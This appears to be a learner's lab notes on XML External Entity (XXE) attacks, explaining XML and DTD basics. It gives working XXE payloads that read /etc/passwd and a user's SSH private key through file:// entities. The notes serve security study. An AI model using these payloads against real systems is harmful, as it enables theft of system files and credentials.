04 - XML External Entity

# XML External Entity (XXE)

Note:
- XXE vulnerabilities attack is a vulnerability that allows attackers abuse/interfere an application's proccessing of XML data, a bit  similar to SQL injection.
- There are two types XXE attacks, in-band and out-band XXE.
- In-band XXE means attacker can receive immediate response to the XXE payload
- Out-band/blind XXE means attacker need to reflect it somewhere such as their own web/live server in order to see the response of XXE payload.


## eXtensible Markup Language (XML)

XML is a markup language that commonly used to transfer data between browser and server like json.

XML has a set of rule for encoding documents in a format that is both readable by human and machine.

### Why XML?
- Independent from programming language and platform
- XML document allows validation using DTD and Schema, free from syntax error.

### Structure of XML:

XML Prolog - Not compulsory but good practice
```
<?xml version="1.0" encoding="UTF-8"?>
```
Every XML document must contain a `ROOT` element. For example:

```
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

`<mail>` is root element
`<to>`,`<from>`,`<subject>`,`<text>` are children of `<mail>`

Without root element, XML document would be considered as invalid XML. 

XML tags are case sensitive. It can also use attributes.

```
<text category="message"> attributes added </text>
```

## Document Type Definition (DTD)

A DTD defines the stucture and attributes of an XML document.

Example DTD:
```
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

Example note that uses DTD for validation:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

## XXE Payload


Example payloads:

1) Define entity called name, assign with feast. Use it on `<lastName>`
```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```
2) Read file from system, `/etc/passwd`
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

## Practice

Payload 1
![2261fcc309d3f09b8b65e0dd99209572.png](./_resources/870c15daeee1430baebee8495b4d87ef.png)

Payload 2
![80a057c4fcc8c58b886c5ea6d70fbe00.png](./_resources/3f7df21b8f2d445db7f9a9948a417236.png)


> 1000 in /etc/passwd means a user account. So, ssh key should be located on /home/username/.ssh/id_rsa

Payload 2: Read SSH key

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>
```

![c2cd7114f3cae63840211ecf2f92a5d6.png](./_resources/e97fedec4521426595e39e245f2936bb.png)


## Question

### XML
![8ce58954700802ca5f8dd2efcd3f45d0.png](./_resources/45e03beafc3347fca6b5a8d64921ca15.png)

### DTD
![d8501f7b3b80080785d93b1c5af8fbed.png](./_resources/51edff5108434f6da4d827314b242a5d.png)

### Exploiting

![3e2bfa1f441861816e8d9177eec73157.png](./_resources/cd0ed8bbb655487c8bf97bb5942c2569.png)